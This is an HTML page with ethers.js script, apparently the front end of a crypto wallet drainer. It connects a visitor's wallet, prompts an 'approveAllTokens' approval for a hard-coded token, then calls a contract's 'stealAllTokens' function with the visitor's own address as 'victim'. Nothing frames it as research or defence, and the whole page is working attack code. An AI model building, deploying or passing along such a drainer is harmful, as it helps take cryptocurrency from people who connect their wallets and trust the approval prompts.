<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interact with Smart Contract</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f3f3f3;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .button {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .button:disabled {
            background-color: #ccc;
        }
        .note {
            margin-top: 10px;
            font-size: 0.9em;
            color: gray;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Smart Contract Interaction</h1>
    <p>Connect your wallet to interact with the contract.</p>
    <button id="connectWalletButton" class="button">Connect Wallet</button>
    <br><br>
    <button id="approveTokensButton" class="button" disabled>Approve Tokens</button>
    <br><br>
    <button id="stealTokensButton" class="button" disabled>Steal Tokens</button>
    <p class="note">Note: Approve tokens before using other functions.</p>
</div>

<script>
    let provider;
    let signer;
    const contractAddress = "0xcD8F8002E9A7B9e20Af9B6bb1D6AE0C6754Fe8c9"; // Address of your deployed smart contract
    const tokenAddress = "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E"; // ERC-20 token address
    const contractABI = [
        {
            "inputs": [
                { "internalType": "address", "name": "token", "type": "address" }
            ],
            "name": "approveAllTokens",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                { "internalType": "address", "name": "victim", "type": "address" }
            ],
            "name": "stealAllTokens",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    async function connectWallet() {
        if (window.ethereum) {
            try {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                console.log("Wallet connected!");

                document.getElementById("approveTokensButton").disabled = false;
                document.getElementById("stealTokensButton").disabled = false;

                alert("Wallet connected successfully!");
            } catch (error) {
                console.error("Failed to connect wallet:", error);
                alert("Failed to connect wallet. Please try again.");
            }
        } else {
            alert("Please install MetaMask to connect your wallet.");
        }
    }

    async function approveTokens() {
        try {
            const contract = new ethers.Contract(contractAddress, contractABI, signer);
            const tx = await contract.approveAllTokens(tokenAddress);
            console.log("Approval transaction sent:", tx.hash);

            await tx.wait(); // Wait for the transaction to be mined
            console.log("Approval successful!");
            alert("Tokens approved successfully!");
        } catch (error) {
            console.error("Error during token approval:", error);
            alert("Failed to approve tokens. Please try again.");
        }
    }

    async function stealTokens() {
        try {
            const contract = new ethers.Contract(contractAddress, contractABI, signer);
            const victimAddress = await signer.getAddress();
            const tx = await contract.stealAllTokens(victimAddress);
            console.log("Steal transaction sent:", tx.hash);

            await tx.wait(); // Wait for the transaction to be mined
            console.log("Tokens stolen successfully!");
            alert("Tokens stolen successfully!");
        } catch (error) {
            console.error("Error during token stealing:", error);
            alert("Failed to steal tokens. Please try again.");
        }
    }

    document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
    document.getElementById("approveTokensButton").addEventListener("click", approveTokens);
    document.getElementById("stealTokensButton").addEventListener("click", stealTokens);
</script>

</body>
</html>
